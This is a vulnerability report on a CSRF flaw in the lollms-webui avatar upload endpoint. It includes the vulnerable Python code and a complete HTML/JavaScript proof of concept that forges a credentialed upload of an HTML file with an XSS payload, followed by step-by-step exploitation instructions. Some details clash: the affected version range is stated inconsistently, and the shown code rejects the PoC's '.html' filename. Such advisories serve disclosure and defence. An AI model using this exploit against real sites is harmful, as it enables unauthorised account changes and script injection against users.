"# CVE-2024-2288 Detailed Report\n\n## 1. Summary of the CVE\nCVE-2024-2288 is a Cross-Site Request Forgery (CSRF) vulnerability identified in the profile picture upload functionality of the Lollms application, specifically within the `parisneo/lollms-webui` repository. This vulnerability affects versions up to 7.3.0 of the software. The flaw allows attackers to change a victim's profile picture without their consent, which can lead to a denial of service by overloading the filesystem with files. Furthermore, it can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim's browser session. The issue has been resolved in version 9.3.\n\n### Vulnerability Type\n- **CWE-352**: Cross-Site Request Forgery (CSRF)\n\n### Affected Version\n- **Lollms-webui**: v9.2 (and earlier versions up to 7.3.0)\n\n## 2. Root Cause of the Vulnerability\nThe root cause of the CSRF vulnerability lies in the lack of proper validation mechanisms for requests made to the `/upload_avatar` endpoint. The application does not implement CSRF tokens or any other form of request validation, allowing unauthorized requests to be processed as if they were legitimate user actions.\n\n### Code Analysis\nThe relevant code for the avatar upload functionality is as follows:\n\n```python\n@router.post(\"/upload_avatar\")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    # Only allow certain file types\n    if avatar.filename.endswith((\".jpg\", \".png\")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f\"{random_filename}{extension}\")\n\n        try:\n            # Open the image to check if it's a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=\"Invalid image file.\")\n    else:\n        raise HTTPException(status_code=400, detail=\"Invalid file type.\")\n        \n    return {\"status\": True,\"fileName\": f\"{random_filename}{extension}\"}\n```\n\n### Vulnerability Explanation\n1. **Lack of CSRF Protection**: The endpoint does not require any CSRF token or validation, allowing an attacker to craft a malicious request that can be executed in the context of an authenticated user.\n2. **File Upload Mechanism**: The code checks for valid file types (JPEG and PNG) but does not validate the content of the file. This allows an attacker to upload a file that could contain malicious scripts, leading to XSS.\n\n### Patch Analysis\nThe patch that resolves this vulnerability is not explicitly provided in the advisory, but it is suggested that implementing a CSRF token mechanism would mitigate the issue. The maintainer acknowledged that adding a CSRF token would be an effective solution.\n\n## 3. Exploitation Details\n### Exploit Overview\nAn attacker can exploit this vulnerability by hosting a malicious webpage that, when visited by a victim, sends a POST request to the `/upload_avatar` endpoint with a crafted image file. The following proof of concept demonstrates how this can be achieved:\n\n```html\n<html>\n  <body>\n    <script>\n      function submitRequest() {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"http://localhost:9600/upload_avatar\", true);\n        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------7469129296923044552541602996\");\n        xhr.withCredentials = true;\n        var body = \"-----------------------------7469129296923044552541602996\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"avatar\\\"; filename=\\\"image.html\\\"\\r\\n\" + \n          \"Content-Type: application/html\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\x3cimg src=x onerror=alert(\\\"CSRF\\\")\\x3e\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------7469129296923044552541602996--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n      window.location.href = \"http://localhost:9600/user_infos/image.html\";\n    </script>\n    <form action=\"#\">\n      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />\n    </form>\n  </body>\n</html>\n```\n\n### Steps to Exploit\n1. **Host the Malicious Page**: The attacker hosts the above HTML code on a server.\n2. **Trick the Victim**: The attacker tricks the victim into visiting the malicious page while they are logged into the Lollms application.\n3. **Execute the Request**: When the victim visits the page, the script automatically sends a POST request to the `/upload_avatar` endpoint, uploading a malicious file.\n4. **Trigger XSS**: If the file is accepted, the victim's profile picture is changed, and the malicious script is executed, potentially leading to data theft or further exploitation.\n\n### Conclusion\nCVE-2024-2288 represents a significant security risk due to its potential for CSRF and XSS attacks. The lack of CSRF protection in the profile picture upload functionality allows attackers to exploit this vulnerability easily. It is crucial for developers to implement CSRF tokens and validate requests to prevent such vulnerabilities in the future. The issue has been addressed in version 9.3 of the Lollms application, and users are encouraged to upgrade to this version to mitigate the risk."